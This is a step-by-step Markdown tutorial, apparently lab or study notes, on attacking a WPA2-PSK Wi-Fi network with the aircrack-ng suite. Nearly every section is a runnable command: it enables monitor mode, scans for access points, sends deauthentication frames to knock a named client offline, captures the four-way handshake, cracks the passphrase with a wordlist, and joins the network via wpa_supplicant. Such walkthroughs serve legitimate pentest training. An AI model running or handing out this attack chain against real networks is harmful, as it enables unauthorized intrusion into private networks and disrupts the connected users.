
# 🛡️ WPA2-PSK Attack
## Time to perform the attack: 7 minutes

## ⚙️ Initial Setup

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

Monitor mode enabled on `wlan0mon`.

---

## 🔍 Scan for Targets

Since WPA2 works both on 2,4Ghz and 5Ghz, check what access points (APs) are active on those frequencies.

**To recognize them check for WPA2-PSK and Cipher CCMP**

```bash
sudo airodump-ng  --band abg wlan0mon
```

From here, identify
- BSSID
- Channel
- ESSID
- Clients

Use TAB and M key to highlight the each APs in order to check also associated clients. 

Ideally we want to attack some AP that has already clients connected to it.

Finally, check the channel where the AP is working and run again to get a cleaner output 

```bash
channel=6
sudo airodump-ng -c ${channel} wlan0mon
```

---

## 🎯 Capture Handshake

It's time to Capture the Handshake and for this we'll capture an **authentication handshake**.

**NOTE:** **WPA2 doesn’t reuse IVs as WEP does**. It uses a secure 4-way handshake to derive session keys.

The attack focuses on capturing this handshake, which occurs only when a client **connects** to the network.

The handshake contains hashed information that can be brute-forced **offline** if the password is weak.

So, we send deauthentication frames to a connected client. The client is forced to disconnect and reconnect. The handshake is captured. BOOM!

📌 It's important to understand that deauth doesn’t flood traffic; it simply forces a re-authentication to trigger the handshake.

Let's do it:

```bash
mkdir WPA2
cd WPA2
channel=6
dumpfile='dump-wpa'
bssid='F0:9F:C2:71:22:12'
client='28:6C:07:6F:F9:43'
essid='wifi-mobile'

sudo airodump-ng -c ${channel}  -w ${dumpfile} --output-format pcap,csv --essid ${essid} --bssid ${bssid} wlan0mon
```
Keep this running! **You're sniffing for the WPA handshake**.

---

## 💣 Force Handshake with Deauth

In a second terminal tab.
Send a deauthentication frame to the choosen client.
In this case it will try to re-authenticate again during our capture.

```bash
bssid='F0:9F:C2:71:22:12'
client='28:6C:07:6F:F9:43'
essid='wifi-mobile'

sudo aireplay-ng -0 1 -e ${essid} -a ${bssid} -c ${client}  wlan0mon
```
This forces the client to disconnect and reconnect, generating the handshake.
At this point come back to terminal 1 and check if a WPA handshake is captured.

---

## 👁️ Confirm Handshake

In the top-right corner of `airodump-ng`output, look for:

```bash
WPA handshake: <BSSID>
```

If you get it, press CTRL+C to stop airodump. 
Also, stop monitoring on wlan0mon:

```bash
sudo airmon-ng stop wlan0mon
```
---

## 🔓 Crack the Password

```bash
wordlist='/usr/share/john/password.lst'
dumpfile='dump-wpa'
bssid='F0:9F:C2:71:22:12'
essid='wifi-mobile'

aircrack-ng -w ${wordlist} -e ${essid} -b ${bssid} ${dumpfile}-01.cap
```

**Substitute `john wordlist` with rockyou.txt if needed.**

---

## 🔌 Connect Using wpa_supplicant

### wpa2.conf

Let's create a network configuration file.

```bash
wpa_key='starwars1'
bssid='F0:9F:C2:71:22:12'
essid='wifi-mobile'

cat << EOF > /tmp/wpa.conf
  network={
         ssid="${essid}"
         key_mgmt=WPA-PSK
         psk="${wpa_key}"
         priority=100
         bssid=${bssid}
        }
EOF
```
We'll use this network configuration file with the tool ‘wpa_suppliant’ and connect to the target WPA2 network.

### Launch connection

In one terminal:
```bash
sudo wpa_supplicant -i wlan0 -c /tmp/wpa.conf
```

In another terminal:
```bash
sudo dhclient wlan0 -v
```
---

## ✅ Confirm Network Access

```bash
target=192.168.2.1
curl http://${target}/proof.txt
```

Look for an assigned `inet` IP like:

```
inet 192.168.2.48/24 brd 192.168.2.255 scope global dynamic wlan0
```

You're inside the network.

---

Next up: PMKID attacks! 
